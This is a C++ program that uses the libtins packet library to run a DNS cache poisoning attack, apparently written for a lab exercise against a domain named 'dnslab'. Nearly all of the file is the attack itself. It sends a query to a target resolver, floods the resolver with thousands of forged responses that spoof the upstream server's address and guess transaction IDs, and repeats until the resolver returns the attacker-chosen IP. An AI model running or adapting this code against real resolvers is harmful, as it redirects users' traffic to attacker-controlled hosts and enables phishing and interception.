#include "spdlog/spdlog.h"
#include "tins/tins.h"
#include <chrono>
#include <cstdint>
#include <string>
#include <thread>
#include <vector>

using namespace Tins;
namespace ch = std::chrono;

EthernetII::address_type get_hw_addr(IPv4Address ip, PacketSender &sender, EthernetII::address_type &gateway) {
    try {
        return Utils::resolve_hwaddr(ip, sender);
    } catch (...) {
        return gateway;
    }
}

EthernetII make_dns_query(std::string server, std::string domain, uint16_t txid, EthernetII::address_type &gateway,
                          PacketSender &sender) {
    DNS dns;
    dns.id(txid);
    dns.type(DNS::QUERY);
    dns.add_query({domain, DNS::A, DNS::IN});
    dns.recursion_desired(1);

    auto dst_hw_addr = get_hw_addr(server, sender, gateway);
    auto info = sender.default_interface().addresses();
    return EthernetII(dst_hw_addr, info.hw_addr) / IP(server, info.ip_addr) / UDP(53, 1337) / dns;
}

EthernetII make_dns_response(std::string server, std::string domain, std::string ip, std::string upstream_dns,
                             uint16_t txid, uint16_t port, EthernetII::address_type &gateway, PacketSender &sender) {
    DNS dns;
    dns.id(txid);
    dns.type(DNS::RESPONSE);
    dns.add_query({domain, DNS::A, DNS::IN});
    dns.add_answer({domain, ip, DNS::A, DNS::IN, 600});
    dns.recursion_desired(1);

    auto dst_hw_addr = get_hw_addr(server, sender, gateway);
    auto info = sender.default_interface().addresses();
    return EthernetII(dst_hw_addr, info.hw_addr) / IP(server, upstream_dns) / UDP(port, 53) / dns;
}

struct Timer {
    ch::steady_clock::time_point start;
    Timer() : start(ch::steady_clock::now()) {}
    auto elapsed() {
        auto now = ch::steady_clock::now();
        return ch::duration_cast<ch::milliseconds>(now - start).count();
    }
};

int main() {
    auto target_server = "192.168.1.3";
    auto target_domain = "dnslab.imool.net";
    auto target_ip = "192.168.2.4";
    auto upstream_dns = "39.107.126.48";
    uint16_t target_port = 23333u;

    uint16_t txid_min = 0x1000;
    uint16_t txid_cnt = 20000;
    auto thread_num = 5;
    auto delay = 10;

    spdlog::info("DNS Poison Attack");

    auto iface = NetworkInterface::default_interface();
    auto info = iface.addresses();
    PacketSender sender{iface};
    spdlog::info("Self: {} - {}", info.hw_addr.to_string(), info.ip_addr.to_string());

    IPv4Address gateway_ip;
    Utils::gateway_from_ip(info.ip_addr, gateway_ip);
    auto gateway_mac = Utils::resolve_hwaddr(gateway_ip, sender);
    spdlog::info("Gateway: {} - {}", gateway_mac.to_string(), gateway_ip.to_string());

    auto query = make_dns_query(target_server, target_domain, 0x1111, gateway_mac, sender);
    std::vector<EthernetII> resp_list{txid_cnt};
    for (uint16_t txid = 0; txid < txid_cnt; txid++) {
        resp_list[txid] = make_dns_response(target_server, target_domain, target_ip, upstream_dns, txid + txid_min,
                                            target_port, gateway_mac, sender);
    }

    while (true) {
        spdlog::info("Sending query and fake replies");

        Timer t;
        sender.send(query);

        std::vector<std::thread> threads;
        for (int i = 0; i < thread_num; i++) {
            auto len = txid_cnt / thread_num;
            auto left = len * i, right = i == thread_num - 1 ? txid_cnt : len * (i + 1);
            threads.emplace_back([&, left, right]() {
                std::for_each(resp_list.begin() + left, resp_list.begin() + right,
                              [&](auto &resp) { sender.send(resp); });
            });
        }
        for (auto &t : threads) {
            t.join();
        }

        spdlog::info("Sent {} fake replies in {} ms", txid_cnt, t.elapsed());

        std::this_thread::sleep_for(ch::seconds(1));
        std::unique_ptr<PDU> reply{sender.send_recv(query)};
        if (reply) {
            auto dns = reply->rfind_pdu<RawPDU>().to<DNS>();
            if (dns.type() == DNS::RESPONSE) {
                for (const auto &record : dns.answers()) {
                    if (record.query_type() == DNS::A && record.dname() == target_domain) {
                        auto ip = record.data();
                        spdlog::info("DNS Record: {} -> {}", target_domain, ip);
                        if (ip == target_ip) {
                            spdlog::info("DNS Poisoned!!!");
                            return 0;
                        }
                    }
                }
            }
        }

        std::this_thread::sleep_for(ch::seconds(delay));
    }
}